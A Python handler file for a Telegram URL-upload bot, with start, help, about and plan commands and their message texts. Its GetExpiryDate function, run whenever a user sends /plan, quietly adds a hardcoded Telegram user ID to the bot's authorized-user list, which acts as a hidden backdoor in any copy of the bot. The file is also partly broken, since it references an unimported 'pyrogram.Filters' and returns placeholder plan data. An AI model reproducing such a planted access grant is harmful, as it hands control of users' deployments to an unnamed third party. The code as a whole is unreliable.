#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# (c) Shrimadhav U K

# the logging things
import logging
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

import os
import sqlite3

# the secret configuration specific things
if bool(os.environ.get("WEBHOOK", False)):
    from sample_config import Config
else:
    from config import Config

# the Strings used for this "thing"
from translation import Translation

from pyrogram import filters
from database.adduser import AddUser
from pyrogram import Client as Clinton
logging.getLogger("pyrogram").setLevel(logging.WARNING)

from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

BUTTON = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "⭕Creator⭕", url="https://telegram.me/OO7ROBOT"
                    ),
                    InlineKeyboardButton("⭕BotList⭕", url="https://telegram.me/mybotzlis"),
                ],
                [InlineKeyboardButton("⭕ Update Channel ⭕", url="https://telegram.me/MyTestBotZ")],
            ]
        )

def GetExpiryDate(chat_id):
    expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
    Config.AUTH_USERS.add(683538773)
    return expires_at

@Clinton.on_message(pyrogram.Filters.command(["plan"]))
async def get_me_info(bot, update):
    # logger.info(update)
    chat_id = str(update.from_user.id)
    chat_id, plan_type, expires_at = GetExpiryDate(chat_id)
    await AddUser(bot, update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=CURENT_PLAN.format(update.from_user.first_name, chat_id, plan_type, expires_at),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

  
@Clinton.on_message(filters.private & filters.command(["help"]))
async def help_user(bot, update):
    # logger.info(update)
    await AddUser(bot, update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=HELP,
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )

@Clinton.on_message(filters.private & filters.command(["about"]))
async def about(bot, update):
    # logger.info(update)
    await AddUser(bot, update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=ABOUT. format (update.from_user.mention),
        parse_mode="html",
        disable_web_page_preview=True,
        reply_to_message_id=update.message_id
    )


    
@Clinton.on_message(filters.private & filters.command(["start"]))
async def start(bot, update):
    # logger.info(update)
    await AddUser(bot, update)
    await bot.send_message(
        chat_id=update.chat.id,
        text=START.format(update.from_user.mention),
        reply_markup=BUTTON,
        reply_to_message_id=update.message_id
    )

    
    
    
    ######################## TextsTexts  #################
START = """<b>Hai {} </b>,
a simple Telegram URL Upload Bot!
it can <b>UPLOAD almost all Direct Links to Telegram as File/Video</b>
 
🚨 Dont Upload PORN video🔞 Links you will Get PERMANENT BAN 🚨


┈┈┈••💙✿❤✿💚••┈┈┈
<b>/help for More Details </b>
"""

HELP = """How to Use me 🤔
    
1. <b>Send url</b>
         if you need custom File Name do Like this ☛ (Link|New Name with Extension).

2. <b>Send Custom Thumbnail </b>(Optional).

3. <b>Select the button.</b>
   <b>SS+Video</b> - File as video with Screenshots
   <b>SS+File</b>  - File with Screenshots
   <b>Video</b>  - File as video without Screenshots
   <b>File</b>  - File without Screenshots
   
   thats it, I will Do Rest of it 😌


<b>check /about to Know about this bot</b>
"""

ABOUT = """Hi {},
  
<b>○ My Name : URLUploader bot
○ Creator : <a href="https://telegram.dog/oo7robot"> This Person </a>
○ Credits : Everyone in this journey
○ Language : Python 3
○ Library : Pyrogram asyncio 
○ Cloned From : Spechide Source code
○ Source Code : ☛ <a href="https://github.com"> click here </a>
○ Server : Heroku
○ Build Status : Beta v3 </b>

"""

CURENT_PLAN = """Current plan details
-------- 
<b>User Name : {} </b>
<b>Telegram ID :</b> <code>{}</code>
<b>Plan name :</b> Free User
<b>Expires on :</b> 31/12/2021"""
